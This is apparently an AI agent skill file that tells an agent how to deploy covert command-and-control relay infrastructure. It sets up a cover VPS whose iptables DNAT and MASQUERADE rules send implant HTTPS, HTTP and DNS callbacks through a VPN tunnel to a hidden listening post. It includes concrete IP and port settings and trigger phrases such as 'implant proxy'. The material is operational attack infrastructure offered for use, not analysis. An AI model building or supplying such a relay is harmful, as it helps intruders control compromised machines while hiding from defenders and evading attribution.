---
name: vpn-covert-redirect
description: "Use when: deploying a covert C2 relay infrastructure using VPN tunnels with iptables NAT forwarding, where a VPS acts as a transparent proxy between implants and a hidden listening post. Triggers: 'C2 relay', 'VPN redirect', 'covert channel', 'NAT forwarding', 'implant proxy'. Requires: VPN server, iptables. NOT for: legitimate VPN setup (use standard VPN docs), or non-covert communications."
---

# VPN Covert Redirect Infrastructure

## Overview

Network infrastructure pattern using a commercial VPS as a covert relay. The VPS appears to host a normal website while transparently forwarding implant traffic through an encrypted VPN tunnel to a hidden listening post. Uses iptables for DNAT, SNAT, and policy-based forwarding.

## Network Topology

```
[Target Implant] --> [Cover VPS (PUBLIC_IP)] --> [VPN Tunnel] --> [Blot Server (HIDDEN)]
                        |                              |
                   Normal HTTP(S)              Encrypted forwarding
                   for other visitors          (only implant traffic)
```

## Configuration

```bash
# redirect.conf
PUBLIC_IP=78.47.131.68       # VPS public IP (from commercial provider)
PRIVATE_IP=91.93.104.178      # Private network IP
TUNNEL_IP=10.177.77.1         # VPN tunnel endpoint
VPN_PORT=43653                # OpenVPN port
ADMIN_PORT=29610              # Management port
VHTTP_PORT=8002               # Internal HTTP relay port
VHTTPS_PORT=44302             # Internal HTTPS relay port
outside_interface=eth0
inside_interface=eth1
tunnel_interface=tun0
```

## iptables Rule Architecture

```bash
initialize() {
    # Default DROP policy -- deny all by default
    iptables -P INPUT DROP
    iptables -P FORWARD DROP
    iptables -P OUTPUT DROP

    # Flush existing rules
    iptables -F INPUT
    iptables -F PREROUTING -t nat
    iptables -F POSTROUTING -t nat
    iptables -F OUTPUT
    iptables -F FORWARD

    # Allow admin access with logging
    iptables -A INPUT -p tcp --dport $ADMIN_PORT -m state \
        --state NEW -j LOG --log-prefix "Inbound Admin Connection: "
    iptables -A INPUT -p tcp --dport $ADMIN_PORT -m state \
        --state NEW,RELATED,ESTABLISHED -j ACCEPT
}

start() {
    initialize

    # VPN tunnel establishment
    iptables -A OUTPUT -p tcp --dport $VPN_PORT -j ACCEPT
    iptables -A INPUT -s $PRIVATE_IP -p tcp --sport $VPN_PORT -j ACCEPT

    # HTTPS DNAT: redirect port 443 to internal tunnel endpoint
    iptables -t nat -A PREROUTING -p tcp -d $PUBLIC_IP --dport 443 \
        -j DNAT --to-destination ${TUNNEL_IP}:${VHTTPS_PORT}
    iptables -t nat -A PREROUTING -i $outside_interface -p tcp \
        -d $PUBLIC_IP --dport $VHTTPS_PORT \
        -j DNAT --to-destination $TUNNEL_IP:$VHTTPS_PORT

    # Forward with logging
    iptables -A FORWARD -i $outside_interface -o $tunnel_interface -p tcp \
        -d $TUNNEL_IP --dport $VHTTPS_PORT -m state --state NEW \
        -j LOG --log-prefix "HTTPS FORWARD: "
    iptables -A FORWARD -i $outside_interface -o $tunnel_interface -p tcp \
        -d $TUNNEL_IP --dport $VHTTPS_PORT -m state --state NEW,RELATED,ESTABLISHED \
        -j ACCEPT
    iptables -A FORWARD -i $tunnel_interface -o $outside_interface -p tcp \
        -s $TUNNEL_IP --sport $VHTTPS_PORT -m state --state RELATED,ESTABLISHED \
        -j ACCEPT

    # SNAT/MASQUERADE on tunnel
    iptables -t nat -A POSTROUTING -o $tunnel_interface -j MASQUERADE

    # Enable IP forwarding
    sysctl -w net.ipv4.ip_forward=1
}
```

## Port Mapping

| External Port | Internal Destination | Purpose |
|---------------|---------------------|---------|
| 443 | TUNNEL_IP:VHTTPS_PORT | Implant HTTPS callback |
| 80 | TUNNEL_IP:VHTTP_PORT | Implant HTTP callback |
| 53 | TUNNEL_IP:VDNS_PORT | DNS (if configured) |
| VPN_PORT | Direct VPN | Tunnel establishment |
| ADMIN_PORT | Direct | Management access |

## Validation

```bash
validIP() {
    case $1 in
        "" | *[!0-9.]* | *[!0-9]) return 1 ;;
    esac
    local IFS=.
    set -- $1
    [ $# -eq 4 ] && [ ${1:-256} -le 255 ] && [ ${2:-256} -le 255 ] \
        && [ ${3:-256} -le 255 ] && [ ${4:-256} -le 255 ]
}
```

## Init Script Integration

Uses chkconfig-style init script with `start|stop|restart|status|zero` commands. The `status` command dumps all iptables rules across all netfilter tables. The `zero` command resets all counters.

## Constraints

- MUST use default DROP policy -- only explicitly allow required traffic
- MUST validate all IP parameters before applying iptables rules
- MUST log all forwarded connections for operational monitoring
- MUST use MASQUERADE (not SNAT) for dynamic tunnel IPs
- SHOULD use stateful firewall rules (NEW, RELATED, ESTABLISHED)
- MUST enable `net.ipv4.ip_forward` via sysctl
- SHOULD separate VPN port traffic from forwarded implant traffic
- NEVER expose the admin port to the public interface
